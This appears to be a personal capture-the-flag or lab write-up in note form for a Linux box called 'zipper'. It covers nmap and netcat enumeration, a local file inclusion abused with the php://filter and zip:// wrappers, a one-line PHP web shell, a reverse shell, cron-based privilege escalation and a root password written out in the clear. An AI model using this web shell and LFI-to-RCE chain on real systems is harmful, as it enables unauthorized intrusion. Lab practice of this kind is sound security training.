### Enumeration
```
IP=192.168.198.229
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80 -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 80
	- Apache httpd 2.4.41 ((Ubuntu))
### Foothold
- 80
	- Default landing page
		- ![[Pasted image 20240816084745.png]]
		- ![[Pasted image 20240816085000.png]]
			- Outputs the uploaded file
		- ![[Pasted image 20240816084856.png]]
		- ![[Pasted image 20240816084901.png]]
	- Versions
	- LFI
		- view-source:http://192.168.198.229/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
			- Nothing
		- view-source:http://192.168.198.229/index.php?file=php://filter/read=convert.base64-encode/resource=index
			- PD9waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwppZihpc3NldCgkZmlsZSkpCnsKICAgIGluY2x1ZGUoIiRmaWxlIi4iLnBocCIpOwp9CmVsc2UKewppbmNsdWRlKCJob21lLnBocCIpOwp9Cj8+Cg==
			- ![[Pasted image 20240816085652.png]]
		- upload
			- ![[Pasted image 20240816085724.png]]
			- Could use php wrapper zip for rce
				- [[LFI - RFI]]
				- `echo '<?php echo system($_GET["cmd"]); ?>' > basicwebshell.php
				- Upload the file
				- Find the name is upload_1723821639.zip
				- `GET /index.php?file=zip://uploads/upload_1723821639.zip%23basicwebshell.php&cmd=whoami
					- Returns 200 OK but no output. Lets try RCE
				- Upload php rev
					- /index.php?file=zip://uploads/upload_1723822144.zip%23rev
					- Removed .php at end since program is removing the .php part
					- We get our rev shell
	- Directory Brute force
		- dirsearch -u http://$IP
			- /style
			- /upload.php
			- /uploads
				- forbidden
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Linux
- www-data
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- needs password
	- uname -a
		- `Linux zipper 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- ping
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- no one
	- netstat -ano
		- Active ports
			- nothing new
	- Directories to check
		- /opt
			- Check GTFO Bins. Treated as SUID
			- backups
				- drwxr-xr-x  2 root root
				- backup.log
					- Uses this directory /opt/backups/backup.zip
					- And zips it?
					- ![[Pasted image 20240816103719.png]]
					- su root
						- WildCardsGoingWild
						- rooted
			- backup.sh
				- -rwxr-xr-x  1 root root
				- ![[Pasted image 20240816095701.png]]
				- cat /root/secret
					- permission denied
				- /var/www/html/uploads
					- a zip file that is the same as /root/secret
					- No access to the file
	- linpeas
		- Possible Exploits
		- Interesting Files
			- Cron
				- `* *     * * *   root    bash /opt/backup.sh
	- pspy64
### Credentials
### Lessons Learned